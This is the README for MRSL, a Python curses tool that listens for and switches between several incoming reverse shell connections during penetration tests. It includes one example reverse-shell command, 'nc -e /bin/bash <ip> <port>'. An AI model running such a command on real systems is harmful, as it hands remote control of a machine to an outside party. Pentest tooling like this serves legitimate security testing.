# MRSL
Multi reverse shell/session listener

Simple python script that uses the curses module to present a console based UI for listening for multiple incoming connnections on a defined port. Originally created to listen for multiple reverse shells during pentests where not using metasploit, think listening for multiple \`nc -e /bin/bash \<ip\> \<port\>\` connections. It can also be used for just listening for incoming connections on an arbitrary port, for instance listening on port 80 on the internet can be interesting.

# Current features:
* Automatic logging of all connections to a file, named \<IP\>--\<timestamp\>.log
* Ability to see all active connections and switch between them
* Ability to type data back, i.e. to run commands in reverse shell or return data to HTTP connections

# Usage:
```
usage: mrsl.py [-h] [-p PORT]

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Port number to listen on (default is 80)
  ```
# Hotkeys:
* TAB: switch between active connections
* F10: close the selected active connection
* F12: exit script, closing all active connections

At any time you can type in a return that will be sent on pressing enter (more work is needed to make the input better, but it's working at a basic level now)


# Notes
More features are planned, but the initial version was created just to serve a current need.

Feedback and pull requests for bugfixes and features are welcome.
